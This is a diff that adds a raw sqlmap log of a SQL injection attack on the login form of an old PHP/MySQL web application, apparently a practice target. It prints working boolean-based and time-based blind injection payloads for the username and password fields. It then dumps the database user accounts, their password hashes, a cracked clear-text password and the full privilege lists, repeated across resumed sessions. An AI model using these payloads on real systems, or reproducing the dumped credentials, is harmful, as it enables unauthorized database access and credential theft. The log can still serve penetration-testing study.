@@ -1,0 +1,219 @@
+sqlmap identified the following injection point(s) with a total of 768 HTTP(s) requests:
+---
+Parameter: psw (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: uname=admin&psw=-7785' OR 2963=2963-- VXxG
+
+    Type: time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
+    Payload: uname=admin&psw=password' AND 5062=BENCHMARK(5000000,MD5(0x57637450))-- Qqyh
+
+Parameter: uname (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: uname=-6704' OR 1553=1553-- qXzo&psw=password
+
+    Type: time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
+    Payload: uname=admin' AND 6340=BENCHMARK(5000000,MD5(0x5558484f))-- anUw&psw=password
+---
+web server operating system: Linux CentOS 4
+web application technology: Apache 2.0.52, PHP 4.3.9
+back-end DBMS: MySQL < 5.0.12
+banner: '4.1.22'
+current user: 'john@localhost'
+current database: 'webapp'
+current user is DBA: False
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: psw (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: uname=admin&psw=-7785' OR 2963=2963-- VXxG
+
+    Type: time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
+    Payload: uname=admin&psw=password' AND 5062=BENCHMARK(5000000,MD5(0x57637450))-- Qqyh
+
+Parameter: uname (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: uname=-6704' OR 1553=1553-- qXzo&psw=password
+
+    Type: time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
+    Payload: uname=admin' AND 6340=BENCHMARK(5000000,MD5(0x5558484f))-- anUw&psw=password
+---
+web server operating system: Linux CentOS 4
+web application technology: Apache 2.0.52, PHP 4.3.9
+back-end DBMS: MySQL < 5.0.0
+banner: '4.1.22'
+current user: 'john@localhost'
+current database: 'webapp'
+current user is DBA: False
+database management system users [2]:
+[*] john
+[*] root
+
+database management system users password hashes:
+[*] john [1]:
+    password hash: 5a6914ba69e02807
+    clear-text password: hiroshima
+[*] root [1]:
+    password hash: 5a6914ba69e02807
+    clear-text password: hiroshima
+
+database management system users privileges:
+[*] john [4]:
+    privilege: delete_priv
+    privilege: insert_priv
+    privilege: select_priv
+    privilege: update_priv
+[*] root (administrator) [21]:
+    privilege: alter_priv
+    privilege: create_priv
+    privilege: create_tmp_table_priv
+    privilege: delete_priv
+    privilege: drop_priv
+    privilege: execute_priv
+    privilege: file_priv
+    privilege: grant_priv
+    privilege: index_priv
+    privilege: insert_priv
+    privilege: lock_tables_priv
+    privilege: process_priv
+    privilege: references_priv
+    privilege: reload_priv
+    privilege: repl_client_priv
+    privilege: repl_slave_priv
+    privilege: select_priv
+    privilege: show_db_priv
+    privilege: shutdown_priv
+    privilege: super_priv
+    privilege: update_priv
+
+database management system users roles:
+[*] john [4]:
+    role: delete_priv
+    role: insert_priv
+    role: select_priv
+    role: update_priv
+[*] root (administrator) [21]:
+    role: alter_priv
+    role: create_priv
+    role: create_tmp_table_priv
+    role: delete_priv
+    role: drop_priv
+    role: execute_priv
+    role: file_priv
+    role: grant_priv
+    role: index_priv
+    role: insert_priv
+    role: lock_tables_priv
+    role: process_priv
+    role: references_priv
+    role: reload_priv
+    role: repl_client_priv
+    role: repl_slave_priv
+    role: select_priv
+    role: show_db_priv
+    role: shutdown_priv
+    role: super_priv
+    role: update_priv
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uname (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: uname=-6704' OR 1553=1553-- qXzo&psw=password
+
+    Type: time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
+    Payload: uname=admin' AND 6340=BENCHMARK(5000000,MD5(0x5558484f))-- anUw&psw=password
+
+Parameter: psw (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: uname=admin&psw=-7785' OR 2963=2963-- VXxG
+
+    Type: time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
+    Payload: uname=admin&psw=password' AND 5062=BENCHMARK(5000000,MD5(0x57637450))-- Qqyh
+---
+web server operating system: Linux CentOS 4
+web application technology: Apache 2.0.52, PHP 4.3.9
+back-end DBMS: MySQL < 5.0.0
+banner: '4.1.22'
+current user: 'john@localhost'
+current database: 'webapp'
+current user is DBA: False
+database management system users [2]:
+[*] john
+[*] root
+
+database management system users password hashes:
+[*] john [1]:
+    password hash: 5a6914ba69e02807
+[*] root [1]:
+    password hash: 5a6914ba69e02807
+
+database management system users privileges:
+[*] john [4]:
+    privilege: delete_priv
+    privilege: insert_priv
+    privilege: select_priv
+    privilege: update_priv
+[*] root (administrator) [21]:
+    privilege: alter_priv
+    privilege: create_priv
+    privilege: create_tmp_table_priv
+    privilege: delete_priv
+    privilege: drop_priv
+    privilege: execute_priv
+    privilege: file_priv
+    privilege: grant_priv
+    privilege: index_priv
+    privilege: insert_priv
+    privilege: lock_tables_priv
+    privilege: process_priv
+    privilege: references_priv
+    privilege: reload_priv
+    privilege: repl_client_priv
+    privilege: repl_slave_priv
+    privilege: select_priv
+    privilege: show_db_priv
+    privilege: shutdown_priv
+    privilege: super_priv
+    privilege: update_priv
+
+database management system users roles:
+[*] john [4]:
+    role: delete_priv
+    role: insert_priv
+    role: select_priv
+    role: update_priv
+[*] root (administrator) [21]:
+    role: alter_priv
+    role: create_priv
+    role: create_tmp_table_priv
+    role: delete_priv
+    role: drop_priv
+    role: execute_priv
+    role: file_priv
+    role: grant_priv
+    role: index_priv
+    role: insert_priv
+    role: lock_tables_priv
+    role: process_priv
+    role: references_priv
+    role: reload_priv
+    role: repl_client_priv
+    role: repl_slave_priv
+    role: select_priv
+    role: show_db_priv
+    role: shutdown_priv
+    role: super_priv
+    role: update_priv
+
